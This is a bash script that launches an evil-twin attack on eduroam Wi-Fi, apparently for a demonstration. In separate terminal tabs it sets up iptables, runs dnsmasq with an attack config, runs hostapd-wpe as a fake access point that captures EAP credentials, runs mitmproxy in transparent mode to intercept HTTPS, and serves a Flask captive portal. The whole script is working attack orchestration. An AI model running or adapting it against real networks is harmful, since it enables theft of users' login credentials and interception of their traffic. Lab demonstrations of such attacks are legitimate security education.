#!/bin/bash

# === Define the terminal emulator to use (make sure gnome-terminal is installed) ===
TERMINAL="gnome-terminal"

# === Paths to configuration and script files ===
IPTABLES_SETUP="/opt/demo_attack_eduroam/scripts/iptables_setup.sh"
HOSTAPD_CONF="/opt/demo_attack_eduroam/hostapd-wpe/hostapd-wpe.conf"
DNSMASQ_CONF="/opt/demo_attack_eduroam/dnsmasq/dnsmasq_attack.conf"
CAPTIVE_SCRIPT="/opt/demo_attack_eduroam/server/server_captive_portal.py"

# === Launch script to set up iptables rules and assign IP to wlan0 ===
$TERMINAL --tab --title="iptables setup" -- bash -c "\
echo '[*] Cleaning up dhcp-hosts.conf and dnsmasq.leases'; \
echo -n > /var/lib/misc/dnsmasq.leases; \
echo -n > /opt/demo_attack_eduroam/dnsmasq/dhcp-hosts.conf; \
sudo bash $IPTABLES_SETUP; \
exec bash"

sleep 3

# === Start dnsmasq (DNS + DHCP server) ===
$TERMINAL --tab --title="dnsmasq" -- bash -c "\
echo '[*] Starting dnsmasq...'; \
sudo dnsmasq -C $DNSMASQ_CONF -d; \
exec bash"

sleep 3

# === Start hostapd-wpe (Fake Access Point with EAP support) ===
$TERMINAL --tab --title="hostapd-wpe" -- bash -c "\
echo '[*] Starting hostapd-wpe...'; \
sudo hostapd-wpe -r $HOSTAPD_CONF; \
exec bash"

sleep 3

# === Start mitmproxy in transparent mode (to intercept HTTPS traffic) ===
$TERMINAL --tab --title="mitmproxy" -- bash -c "\
echo '[*] Starting mitmproxy...'; \
sudo mitmproxy --mode transparent --showhost -p 8080"

sleep 3

# === Start Flask-based captive portal ===
$TERMINAL --tab --title="Captive Portal" -- bash -c "\
echo '[*] Starting Flask captive portal...'; \
sudo python3 $CAPTIVE_SCRIPT; \
exec bash"
